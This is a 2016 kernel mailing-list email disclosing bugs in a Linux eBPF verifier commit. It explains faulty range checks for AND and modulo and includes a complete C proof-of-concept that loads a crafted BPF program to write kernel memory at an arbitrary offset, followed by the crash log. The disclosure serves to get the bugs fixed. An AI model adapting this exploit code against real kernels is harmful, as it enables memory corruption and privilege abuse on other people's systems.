From: Jann Horn <jannh@google.com>
Subject: 484611357c19 introduces arbitrary kernel write bug (root-only)
Date: Wed, 9 Nov 2016 01:23:17 +0100
Message-ID: <CAG48ez0mP4xwv6vnKRJ+rcdXYyA1wGnCWsbkKUgWGSBbMtgFMw@mail.gmail.com>
Mime-Version: 1.0
Content-Type: text/plain; charset=UTF-8
Cc: security@kernel.org, netdev@vger.kernel.org
To: Daniel Borkmann <daniel@iogearbox.net>,
        Alexei Starovoitov <ast@kernel.org>,
        "David S. Miller" <davem@davemloft.net>,
        Josef Bacik <jbacik@fb.com>
Return-path: <netdev-owner@vger.kernel.org>
Received: from mail-it0-f41.google.com ([209.85.214.41]:35468 "EHLO
        mail-it0-f41.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S1752364AbcKIAXj (ORCPT
        <rfc822;netdev@vger.kernel.org>); Tue, 8 Nov 2016 19:23:39 -0500
Received: by mail-it0-f41.google.com with SMTP id e187so181675503itc.0
        for <netdev@vger.kernel.org>; Tue, 08 Nov 2016 16:23:38 -0800 (PST)
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

In 484611357c19 (not in any stable kernel yet), functionality is
introduced that allows root (and afaics nobody else, since nobody else
is allowed to perform pointer arithmetic) to basically write to (and
read from) arbitrary kernel memory. There are multiple bugs in the
validation logic:

 - A bitwise AND of values in the ranges [a,b] and [c,d] is assumed to
always result in a value
   >= a&b. However, for the combination of ranges [1,1] and [1,2],
this calculates a minimum of 1
   while actually, 1&2 is zero. This is the bug that my crasher
(below) triggers.
 - a%b is assumed to always be smaller than b-1. However, for b==0,
this will calculate an upper
   limit of -1 while the values will actually always be zero.
 - I'm not sure about this, but I think that, when only one end of the
range is bounded, the logic will
   incorrectly also treat the other end as a bounded, and because of
the usage of bound
   placeholders that are smaller than the actual maximum values, this
could be used to perform
   out-of-bounds accesses.

The fun part here is that, as soon as the validation is just
off-by-one, arithmetic transformations can be used to turn that into
out-of-bounds accesses at arbitrary offsets. The crasher turns the
off-by-one into a memory write at offset 0x10000000.

Here's the crasher program:
=====================
#define _GNU_SOURCE
#include <err.h>
#include <stdint.h>
#include <linux/bpf.h>
#include <linux/filter.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <asm/unistd_64.h>
#include <sys/types.h>
#include <sys/socket.h>

/* start from kernel */
#define BPF_EMIT_CALL(FUNC)                 \
    ((struct bpf_insn) {                    \
        .code  = BPF_JMP | BPF_CALL,            \
        .dst_reg = 0,                   \
        .src_reg = 0,                   \
        .off   = 0,                 \
        .imm   = (FUNC) }) /* ??? */
#define BPF_MOV32_IMM(DST, IMM)                 \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU | BPF_MOV | BPF_K,     \
        .dst_reg = DST,                 \
        .src_reg = 0,                   \
        .off   = 0,                 \
        .imm   = IMM })
#define BPF_REG_ARG1    BPF_REG_1
#define BPF_REG_ARG2    BPF_REG_2
#define BPF_REG_ARG3    BPF_REG_3
#define BPF_REG_ARG4    BPF_REG_4
#define BPF_REG_ARG5    BPF_REG_5
#define BPF_PSEUDO_MAP_FD   1
#define BPF_LD_IMM64_RAW(DST, SRC, IMM)             \
    ((struct bpf_insn) {                    \
        .code  = BPF_LD | BPF_DW | BPF_IMM,     \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = 0,                 \
        .imm   = (__u32) (IMM) }),          \
    ((struct bpf_insn) {                    \
        .code  = 0, /* zero is reserved opcode */   \
        .dst_reg = 0,                   \
        .src_reg = 0,                   \
        .off   = 0,                 \
        .imm   = ((__u64) (IMM)) >> 32 })
#define BPF_ALU32_IMM(OP, DST, IMM)             \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU | BPF_OP(OP) | BPF_K,      \
        .dst_reg = DST,                 \
        .src_reg = 0,                   \
        .off   = 0,                 \
        .imm   = IMM })
#define BPF_LD_MAP_FD(DST, MAP_FD)              \
    BPF_LD_IMM64_RAW(DST, BPF_PSEUDO_MAP_FD, MAP_FD)
#define BPF_ALU32_REG(OP, DST, SRC)             \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU | BPF_OP(OP) | BPF_X,      \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = 0,                 \
        .imm   = 0 })
#define BPF_EXIT_INSN()                     \
    ((struct bpf_insn) {                    \
        .code  = BPF_JMP | BPF_EXIT,            \
        .dst_reg = 0,                   \
        .src_reg = 0,                   \
        .off   = 0,                 \
        .imm   = 0 })
/* Memory store, *(uint *) (dst_reg + off16) = src_reg */
#define BPF_STX_MEM(SIZE, DST, SRC, OFF)            \
    ((struct bpf_insn) {                    \
        .code  = BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,    \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = OFF,                   \
        .imm   = 0 })
#define BPF_REG_FP  BPF_REG_10
#define BPF_MOV64_REG(DST, SRC)                 \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = 0,                 \
        .imm   = 0 })
#define BPF_ALU64_IMM(OP, DST, IMM)             \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_K,    \
        .dst_reg = DST,                 \
        .src_reg = 0,                   \
        .off   = 0,                 \
        .imm   = IMM })
#define BPF_MOV64_REG(DST, SRC)                 \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU64 | BPF_MOV | BPF_X,       \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = 0,                 \
        .imm   = 0 })
#define BPF_REG_TMP BPF_REG_8
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)            \
    ((struct bpf_insn) {                    \
        .code  = BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = OFF,                   \
        .imm   = 0 })
#define BPF_JMP_IMM(OP, DST, IMM, OFF)              \
    ((struct bpf_insn) {                    \
        .code  = BPF_JMP | BPF_OP(OP) | BPF_K,      \
        .dst_reg = DST,                 \
        .src_reg = 0,                   \
        .off   = OFF,                   \
        .imm   = IMM })
#define BPF_MOV64_IMM(DST, IMM)                 \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU64 | BPF_MOV | BPF_K,       \
        .dst_reg = DST,                 \
        .src_reg = 0,                   \
        .off   = 0,                 \
        .imm   = IMM })
#define BPF_ALU64_REG(OP, DST, SRC)             \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU64 | BPF_OP(OP) | BPF_X,    \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = 0,                 \
        .imm   = 0 })
#define BPF_MOV32_REG(DST, SRC)                 \
    ((struct bpf_insn) {                    \
        .code  = BPF_ALU | BPF_MOV | BPF_X,     \
        .dst_reg = DST,                 \
        .src_reg = SRC,                 \
        .off   = 0,                 \
        .imm   = 0 })
/* end from kernel */


int bpf_(int cmd, union bpf_attr *attrs) {
    return syscall(__NR_bpf, cmd, attrs, sizeof(*attrs));
}

void array_set(int mapfd, uint32_t key, uint32_t value) {
    union bpf_attr attr = {
        .map_fd = mapfd,
        .key    = (uint64_t)&key,
        .value  = (uint64_t)&value,
        .flags  = BPF_ANY,
    };


    int res = bpf_(BPF_MAP_UPDATE_ELEM, &attr);
    if (res)
        err(1, "map update elem");
}


int main(void) {
    union bpf_attr create_map_attrs = {
        .map_type = BPF_MAP_TYPE_ARRAY,
        .key_size = 4,
        .value_size = 4,
        .max_entries = 16
    };
    int mapfd = bpf_(BPF_MAP_CREATE, &create_map_attrs);
    if (mapfd == -1)
        err(1, "map create");


    array_set(mapfd, 1, 1);

    char verifier_log[100000];
    struct bpf_insn insns[] = {
        // r9 = 1[1,1] (checked)
        BPF_MOV64_IMM(BPF_REG_9, 1),

        // r0 = 2[?,?]
        BPF_LD_MAP_FD(BPF_REG_ARG1, mapfd),

        BPF_MOV64_REG(BPF_REG_TMP, BPF_REG_FP),
        BPF_ALU64_IMM(BPF_ADD, BPF_REG_TMP, -4), /* allocate 4 bytes stack */
        BPF_MOV32_IMM(BPF_REG_ARG2, 1),
        BPF_STX_MEM(BPF_W, BPF_REG_TMP, BPF_REG_ARG2, 0),
        BPF_MOV64_REG(BPF_REG_ARG2, BPF_REG_TMP),
        BPF_EMIT_CALL(BPF_FUNC_map_lookup_elem),
        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 2),
        BPF_MOV64_REG(BPF_REG_0, 0), /* prepare exit */
        BPF_EXIT_INSN(), /* exit */
        BPF_LDX_MEM(BPF_W, BPF_REG_1, BPF_REG_0, 0),

        // r9 = 1[0,1] (checked)
        BPF_ALU32_IMM(BPF_MOD, BPF_REG_1, 2),

        // r9 = 2[1,2] (checked)
        BPF_ALU32_IMM(BPF_ADD, BPF_REG_1, 1),

        // r9 = 0[1,2]
        BPF_ALU32_REG(BPF_AND, BPF_REG_9, BPF_REG_1),

        // r9 = 1[2,3]
        BPF_ALU32_IMM(BPF_ADD, BPF_REG_9, 1),

        // r9 = 0[1,1]
        BPF_ALU32_IMM(BPF_RSH, BPF_REG_9, 1),

        // r3 = 1[0, 0]
        BPF_MOV32_IMM(BPF_REG_3, 1),
        BPF_ALU32_REG(BPF_SUB, BPF_REG_3, BPF_REG_9),

        BPF_ALU32_IMM(BPF_MUL, BPF_REG_3, 0x10000000),

        BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_3),
        BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_TMP, 0),

        BPF_MOV64_REG(BPF_REG_0, 0), /* prepare exit */
        BPF_EXIT_INSN() /* exit */
    };
    union bpf_attr create_prog_attrs = {
        .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
        .insn_cnt = sizeof(insns) / sizeof(insns[0]),
        .insns = (uint64_t)insns,
        .license = (uint64_t)"",
        .log_level = 1,
        .log_size = sizeof(verifier_log),
        .log_buf = (uint64_t)verifier_log
    };
    int progfd = bpf_(BPF_PROG_LOAD, &create_prog_attrs);
    if (progfd == -1) {
        perror("prog load");
        puts(verifier_log);
        return 1;
    }
    puts("ok so far?");

    int socks[2];
    if (socketpair(AF_UNIX, SOCK_DGRAM, 0, socks))
        err(1, "socketpair");
    if (setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(int)))
        err(1, "setsockopt");
    if (write(socks[1], "a", 1) != 1)
        err(1, "write");
    char c;
    if (read(socks[0], &c, 1) != 1)
        err(1, "read res");
    return 0;
}
=====================

Here's the output on my machine:

=====================
[11531.002114] BUG: unable to handle kernel paging request at ffff88021983a370
[11531.002119] IP: [<ffffffff8116db11>] __bpf_prog_run+0xf51/0x12f0
[11531.002125] PGD 2020067
[11531.002126] PUD 2023067
[11531.002127] PMD 0

[11531.002129] Oops: 0002 [#4] SMP
[11531.002131] Modules linked in: cfg80211 nfsd auth_rpcgss nfs_acl
nfs lockd grace fscache sunrpc ppdev sb_edac edac_core joydev pcspkr
snd_intel8x0 serio_raw snd_ac97_codec ac97_bus snd_pcm snd_timer snd
soundcore i2c_piix4 parport_pc parport evbug mac_hid video autofs4
hid_generic usbhid hid psmouse ahci libahci e1000 pata_acpi
[11531.002145] CPU: 0 PID: 1496 Comm: bounds_fail Tainted: G      D
     4.9.0-rc4 #6
[11531.002146] Hardware name: innotek GmbH VirtualBox/VirtualBox, BIOS
VirtualBox 12/01/2006
[11531.002147] task: ffff880208d654c0 task.stack: ffffc900011f4000
[11531.002148] RIP: 0010:[<ffffffff8116db11>]  [<ffffffff8116db11>]
__bpf_prog_run+0xf51/0x12f0
[11531.002150] RSP: 0018:ffffc900011f7a60  EFLAGS: 00010202
[11531.002151] RAX: ffffc900011f7cbc RBX: ffffc90000ced0e0 RCX: ffff88021983a370
[11531.002151] RDX: 0000000000000000 RSI: 0000000000000001 RDI: 0000000000000001
[11531.002152] RBP: ffffc900011f7cd8 R08: ffffc900011f7ad0 R09: 0000000000000300
[11531.002153] R10: ffff88020b401280 R11: 0000000000000000 R12: ffffffff8181e6e0
[11531.002153] R13: 0000000000000000 R14: ffffc900011f7de8 R15: 0000000000000001
[11531.002155] FS:  00007f39b0804700(0000) GS:ffff880213c00000(0000)
knlGS:0000000000000000
[11531.002156] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[11531.002156] CR2: ffff88021983a370 CR3: 000000020998d000 CR4: 00000000000006f0
[11531.002160] Stack:
[11531.002161]  0000000000000000 ffff88021983a370 0000000000000002
ffffc900011f7cbc
[11531.002162]  0000000010000000 ffffc900011f7b10 ffffc900011f7ad0
ffffffff810b1d61
[11531.002164]  ffff880208d654c0 ffffc900011f7cbc 0000000000000000
ffffc900011f7cc0
[11531.002165] Call Trace:
[11531.002170]  [<ffffffff810b1d61>] ? update_curr+0x71/0x180
[11531.002172]  [<ffffffff810ad7ac>] ? __enqueue_entity+0x6c/0x70
[11531.002173]  [<ffffffff810b4302>] ? enqueue_entity+0x502/0xd40
[11531.002175]  [<ffffffff810ad7ac>] ? __enqueue_entity+0x6c/0x70
[11531.002176]  [<ffffffff810b4302>] ? enqueue_entity+0x502/0xd40
[11531.002178]  [<ffffffff810b5dbb>] ? check_preempt_wakeup+0x14b/0x210
[11531.002181]  [<ffffffff811f3863>] ? __kmalloc_node_track_caller+0x1c3/0x280
[11531.002185]  [<ffffffff816d2b8e>] ? __alloc_skb+0x7e/0x280
[11531.002186]  [<ffffffff816d0b71>] ? __kmalloc_reserve.isra.37+0x31/0x90
[11531.002188]  [<ffffffff816d2b5e>] ? __alloc_skb+0x4e/0x280
[11531.002189]  [<ffffffff816d2ba2>] ? __alloc_skb+0x92/0x280
[11531.002191]  [<ffffffff816d2dea>] ? alloc_skb_with_frags+0x5a/0x1c0
[11531.002193]  [<ffffffff813e3af8>] ? copy_from_iter+0x88/0x370
[11531.002197]  [<ffffffff81701c90>] sk_filter_trim_cap+0x70/0x1a0
[11531.002200]  [<ffffffff8178cd88>] unix_dgram_sendmsg+0x218/0x660
[11531.002204]  [<ffffffff816c9a38>] sock_sendmsg+0x38/0x50
[11531.002205]  [<ffffffff816c9ac8>] sock_write_iter+0x78/0xd0
[11531.002208]  [<ffffffff812167b4>] __vfs_write+0xc4/0x120
[11531.002210]  [<ffffffff81217572>] vfs_write+0xb2/0x1b0
[11531.002212]  [<ffffffff812188a6>] SyS_write+0x46/0xa0
[11531.002215]  [<ffffffff817f45fb>] entry_SYSCALL_64_fastpath+0x1e/0xad
[11531.002216] Code: 24 c4 0f b6 43 01 48 0f bf 53 02 48 83 c3 08 48
89 c1 c0 e8 04 83 e1 0f 83 e0 0f 48 8b 8c cd 90 fd ff ff 48 8b 84 c5
90 fd ff ff <89> 04 11 0f b6 03 41 ff 24 c4 0f b6 43 01 48 89 c2 c0 e8
04 83
[11531.002231] RIP  [<ffffffff8116db11>] __bpf_prog_run+0xf51/0x12f0
[11531.002233]  RSP <ffffc900011f7a60>
[11531.002233] CR2: ffff88021983a370
[11531.002235] ---[ end trace 86ae051962a2d276 ]---
=====================
